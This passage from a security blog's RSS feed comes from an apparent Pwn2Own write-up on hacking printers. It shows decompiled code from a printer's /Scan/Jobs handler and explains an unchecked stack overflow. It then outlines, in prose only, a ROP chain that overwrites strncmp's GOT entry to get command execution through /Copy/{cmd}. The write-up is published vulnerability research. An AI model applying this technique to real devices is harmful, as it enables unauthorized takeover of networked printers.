  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-D8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-B8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+48h] [bp-98h] BYREF&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/UserReadyToScan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/Jobs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_37:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x411FA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//------------------------------------------------------ [2]  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Pages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_scan_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rest_scan_vp_thread_created&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_err_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But when it parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;, it does not check the length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt;. Then copy the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt; to the local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;first_path_info[32]&lt;/code&gt;), which leads to a stack overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can construct the request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Scan/Jobs/&lt;/code&gt; to trigger it. It does not have Stack Guard, so we can overwrite the return address directly. But it has DEP, we need to do ROP to achieve our goal. Finally, we use ROP to overwrite the GOT of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncmp&lt;/code&gt;. After overwriting it, we can execute arbitrary commands when we access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Copy/{cmd}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However, in the end, this vulnerability collided with another team‚Äôs discovery.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Based on the results from Pwn2Own Austin 2021 to Pwn2Own Toronto 2022, printer security remains an easily overlooked issue. In just one year, the number of teams capable of compromising printers has significantly increased. Even in the third year, at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2023/10/23/pwn2own-toronto-2023-the-schedule&quot;&gt;Pwn2Own Toronto 2023&lt;/a&gt;, many teams still found vulnerabilities. It is recommended for everyone using these IoT devices to turn off unnecessary services, set up firewalls properly, and ensure appropriate access controls to reduce the risk of attacks.&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/</link>
                <guid>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en</guid>
                <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âç∞Ë°®Ê©üËøëÂπ¥‰æÜÂ∑≤ÊàêÁÇ∫‰ºÅÊ•≠ÂÖßÁ∂≤‰∏≠‰∏çÂèØÊàñÁº∫ÁöÑË®≠ÂÇô‰πã‰∏ÄÔºåÂäüËÉΩ‰πüÈö®ËëóÁßëÊäÄÁöÑÁôºÂ±ïÊó•ÁõäÂ¢ûÂ§öÔºåÈô§‰∫Ü‰∏ÄËà¨ÁöÑÂÇ≥ÁúüÂèäÂàóÂç∞‰πãÂ§ñÔºå‰πüÈñãÂßãÊîØÊè¥ AirPrint Á≠âÈõ≤Á´ØÂàóÂç∞ÊúçÂãôÔºåËÆìÂàóÂç∞Êõ¥Âä†Êñπ‰æøÔºåÁõ¥Êé•‰ΩøÁî®Ë°åÂãïË£ùÁΩÆÂ∞±ÂèØ‰ª•ËºïÈ¨ÜÂàóÂç∞ÔºåÊõ¥ÊàêÁÇ∫‰∫Ü IoT ‰∏≠Ôºå‰∏çÂèØÊàñÁº∫ÁöÑ‰∏ÄÁí∞ÔºåÊ≠£Âõ†ÁÇ∫ÂÖ∂‰æøÂà©Ôºå‰πüÂ∏∏Ë¢´Áî®ÊñºÂàóÂç∞ÂÖ¨Âè∏ÂÖßÈÉ®Ê©üÊïèÊñá‰ª∂Ôºå‰ΩøÂæóÂú®‰ºÅÊ•≠‰∏≠Âç∞Ë°®Ê©üÁöÑÂÆâÂÖ®ÊÄßÊõ¥Âä†ÁöÑÈáçË¶Å„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÂâçÂπ¥ÊàëÂÄë‰πüÂú® Canon Âèä HP ÁöÑÂç∞Ë°®Ê©ü‰∏≠ÁôºÁèæ‰∫Ü Pre-auth RCE ÁöÑÊºèÊ¥û(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-515/&quot;&gt;CVE-2022-24673&lt;/a&gt; Âèä &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-532/&quot;&gt;CVE-2022-3942&lt;/a&gt;) Âèä Lexmark ÁôºÁèæÊºèÊ¥û(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-332/&quot;&gt;CVE-2021-44734&lt;/a&gt;)Ôºå‰∏¶Âú® Pwn2Own Austin 2021 ‰∏≠ÂèñÂæó‰∫Ü Canon ImageCLASS MF644Cdw„ÄÅ HP Color LaserJet Pro MFP M283fdw Âèä Lexmark MC3224i ÁöÑÊéßÂà∂Ê¨äÔºåËÄåÊàêÂäüÁç≤Âæó Pwn2Own ‰∏≠Èß≠ÂÆ¢Â§ßÂ∏´(Master of Pwn) ÁöÑÈªûÊï∏ÔºåÈÄôÁØáÁ†îÁ©∂Â∞áË¨õËø∞ Canon Âèä HP ÊºèÊ¥ûÁöÑÁ¥∞ÁØÄÂèäÊàëÂÄëÁöÑÂà©Áî®ÊñπÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ê≠§‰ªΩÁ†îÁ©∂‰∫¶ÁôºË°®Êñº &lt;a href=&quot;https://hitcon.org/2022/agenda/704bf58c-c42b-4593-97c0-9aba91caa6e4&quot;&gt;HITCON 2022&lt;/a&gt; Âèä &lt;a href=&quot;https://codeblue.jp/2022/en/talks/&quot;&gt;CODE BLUE 2022&lt;/a&gt;Ôºå‰Ω†ÂèØ‰ª•Âæû&lt;a href=&quot;https://hitcon.org/2022/slides/Your%20Printer%20is%20not%20your%20Printer%20!%20-%20Hacking%20Printers%20at%20Pwn2Own.pdf&quot;&gt;ÈÄôË£°&lt;/a&gt;ÂèñÂæóÊäïÂΩ±ÁâáÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
